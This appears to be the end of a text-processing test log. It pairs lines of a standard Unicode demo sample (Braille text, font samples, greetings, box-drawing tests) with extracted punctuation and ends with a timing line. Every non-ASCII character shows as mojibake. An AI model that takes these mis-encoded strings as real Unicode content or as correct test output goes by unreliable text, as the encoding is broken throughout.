+03642:   â¡Žâ Šâ —â •â •â ›â ‘â °â Ž â â â â ‘ â ºâ â Ž â ›â •â •â ™ â ¥â â •â  â °â¡¡â â â ›â ‘â ‚ â ‹â •â — â â â ¹â ¹â ”â › â ™â ‘
+03643: Pnct:                    
+03644:   â ¡â •â Žâ ‘ â žâ • â â ¥â ž â ™â Šâ Ž â ™â â â ™ â žâ •â ²
+03645: Pnct:              
+03646:   â¡•â ‡â ™ â¡â œâ ‡â ‘â ¹ â ºâ â Ž â â Ž â ™â ‘â â ™ â â Ž â  â ™â •â •â —â ¤â â â Šâ ‡â ²
+03647: Pnct:                  
+03648:   â¡â ”â ™â – â¡Š â ™â •â â °â ž â â ‘â â  â žâ • â Žâ â ¹ â ¹â â ž â¡Š â …â â ªâ ‚ â •â ‹ â â ¹
+03649: Pnct:                        
+03650:   â ªâ  â …â â ªâ ‡â «â ›â ‘â ‚ â ±â â ž â ¹â »â ‘ â Šâ Ž â â œâ žâ Šâ Šâ ¥â ‡â œâ ‡â ¹ â ™â ‘â â ™ â â ƒâ ³â ž
+03651: Pnct:                  
+03652:   â  â ™â •â •â —â ¤â â â Šâ ‡â ² â¡Š â â Šâ £â ž â ™â â §â ‘ â ƒâ ‘â ² â ”â Šâ ‡â ”â «â ‚ â â ¹â Žâ ‘â ‡â ‹â ‚ â žâ •
+03653: Pnct:                    
+03654:   â —â ‘â ›â œâ ™ â  â Šâ •â ‹â ‹â ”â ¤â â â Šâ ‡ â â Ž â ¹â ‘ â ™â ‘â â ™â ‘â Œ â â Šâ ‘â Šâ ‘ â •â ‹ â Šâ —â •â â â •â â ›â »â ¹
+03655: Pnct:                    
+03656:   â ” â ¹â ‘ â žâ —â â ™â ‘â ² â¡ƒâ ¥â ž â ¹â ‘ â ºâ Šâ Žâ ™â •â  â •â ‹ â ³â — â â â Šâ ‘â Œâ •â —â Ž
+03657: Pnct:                    
+03658:   â Šâ Ž â ” â ¹â ‘ â Žâ Šâ â Šâ ‡â ‘â † â â â ™ â â ¹ â ¥â â ™â â ‡â ‡â ªâ « â ™â â â ™â Ž
+03659: Pnct:                  
+03660:   â ©â â ‡â ‡ â â •â ž â ™â Šâ Œâ ¥â —â ƒ â Šâ žâ ‚ â •â — â ¹â ‘ â¡Šâ ³â â žâ —â ¹â °â Ž â ™â •â â ‘ â ‹â •â —â ² â¡¹â ³
+03661: Pnct:                      
+03662:   â ºâ Šâ ‡â ‡ â ¹â »â ‘â ‹â •â —â ‘ â â »â â Šâ ž â â ‘ â žâ • â —â ‘â â ‘â â žâ ‚ â ‘â â â ™â â žâ Šâ Šâ â ‡â ‡â ¹â ‚ â ¹â â ž
+03663: Pnct:                  
+03664:   â¡â œâ ‡â ‘â ¹ â ºâ â Ž â â Ž â ™â ‘â â ™ â â Ž â  â ™â •â •â —â ¤â â â Šâ ‡â ²
+03665: Pnct:                
+03666:   (The first couple of paragraphs of "A Christmas Carol" by Dickens)
+03667: Pnct:     (             "     "     )
+03668: Compact font selection example text:
+03669: Pnct:         :
+03670:   ABCDEFGHIJKLMNOPQRSTUVWXYZ /0123456789
+03671: Pnct:       /
+03672:   abcdefghijklmnopqrstuvwxyz Â£Â©ÂµÃ€Ã†Ã–ÃžÃŸÃ©Ã¶Ã¿
+03673: Pnct:       Â£ Â© Âµ
+03674:   â€“â€”â€˜â€œâ€â€žâ€ â€¢â€¦â€°â„¢Å“Å Å¸Å¾â‚¬ Î‘Î’Î“Î”Î©Î±Î²Î³Î´Ï‰ ÐÐ‘Ð’Ð“Ð”Ð°Ð±Ð²Ð³Ð´
+03675: Pnct:     â€“ â€” â€˜ â€œ â€ â€ž â€  â€¢ â€¦ â€°    
+03676:   âˆ€âˆ‚âˆˆâ„âˆ§âˆªâ‰¡âˆž â†‘â†—â†¨â†»â‡£ â”â”¼â•”â•˜â–‘â–ºâ˜ºâ™€ ï¬ï¿½â‘€â‚‚á¼ á¸‚Ó¥áº„ÉËâŽ×Ô±áƒ
+03677: Pnct:          
+03678: Greetings in various languages:
+03679: Pnct:       :
+03680:   Hello world, ÎšÎ±Î»Î·Î¼á½³ÏÎ± Îºá½¹ÏƒÎ¼Îµ, ã‚³ãƒ³ãƒ‹ãƒãƒ
+03681: Pnct:       ,     ,  
+03682: Box drawing alignment tests:                                          â–ˆ
+03683: Pnct:       :                                                                                    
+03684:                                                                       â–‰
+03685: Pnct:                                                                                                                                            
+03686:   â•”â•â•â•¦â•â•â•—  â”Œâ”€â”€â”¬â”€â”€â”  â•­â”€â”€â”¬â”€â”€â•®  â•­â”€â”€â”¬â”€â”€â•®  â”â”â”â”³â”â”â”“  â”Žâ”’â”â”‘   â•·  â•» â”â”¯â”“ â”Œâ”°â”    â–Š â•±â•²â•±â•²â•³â•³â•³
+03687: Pnct:                                                
+03688:   â•‘â”Œâ”€â•¨â”€â”â•‘  â”‚â•”â•â•§â•â•—â”‚  â”‚â•’â•â•ªâ•â••â”‚  â”‚â•“â”€â•â”€â•–â”‚  â”ƒâ”Œâ”€â•‚â”€â”â”ƒ  â”—â•ƒâ•„â”™  â•¶â”¼â•´â•ºâ•‹â•¸â” â”¼â”¨ â”â•‹â”¥    â–‹ â•²â•±â•²â•±â•³â•³â•³
+03689: Pnct:                                        
+03690:   â•‘â”‚â•² â•±â”‚â•‘  â”‚â•‘   â•‘â”‚  â”‚â”‚ â”‚ â”‚â”‚  â”‚â•‘ â”ƒ â•‘â”‚  â”ƒâ”‚ â•¿ â”‚â”ƒ  â”â•…â•†â”“   â•µ  â•¹ â”—â”·â”› â””â”¸â”˜    â–Œ â•±â•²â•±â•²â•³â•³â•³
+03691: Pnct:                                                                    
+03692:   â• â•¡ â•³ â•žâ•£  â”œâ•¢   â•Ÿâ”¤  â”œâ”¼â”€â”¼â”€â”¼â”¤  â”œâ•«â”€â•‚â”€â•«â”¤  â”£â”¿â•¾â”¼â•¼â”¿â”«  â”•â”›â”–â”š     â”Œâ”„â”„â” â•Ž â”â”…â”…â”“ â”‹ â– â•²â•±â•²â•±â•³â•³â•³
+03693: Pnct:                                                      
+03694:   â•‘â”‚â•± â•²â”‚â•‘  â”‚â•‘   â•‘â”‚  â”‚â”‚ â”‚ â”‚â”‚  â”‚â•‘ â”ƒ â•‘â”‚  â”ƒâ”‚ â•½ â”‚â”ƒ  â–‘â–‘â–’â–’â–“â–“â–ˆâ–ˆ â”Š  â”† â•Ž â•  â”‡ â”‹ â–Ž
+03695: Pnct:                                                              
+03696:   â•‘â””â”€â•¥â”€â”˜â•‘  â”‚â•šâ•â•¤â•â•â”‚  â”‚â•˜â•â•ªâ•â•›â”‚  â”‚â•™â”€â•€â”€â•œâ”‚  â”ƒâ””â”€â•‚â”€â”˜â”ƒ  â–‘â–‘â–’â–’â–“â–“â–ˆâ–ˆ â”Š  â”† â•Ž â•  â”‡ â”‹ â–
+03697: Pnct:                                          
+03698:   â•šâ•â•â•©â•â•â•  â””â”€â”€â”´â”€â”€â”˜  â•°â”€â”€â”´â”€â”€â•¯  â•°â”€â”€â”´â”€â”€â•¯  â”—â”â”â”»â”â”â”›  â–—â–„â––â–›â–€â–œ   â””â•Œâ•Œâ”˜ â•Ž â”—â•â•â”› â”‹  â–â–‚â–ƒâ–„â–…â–†â–‡â–ˆ
+03699: Pnct:                                        
+03700:                                                â–â–€â–˜â–™â–„â–Ÿ
+03701: Pnct:                                                                                              
+03702: **** TEST END ***** (0.6720 s.)
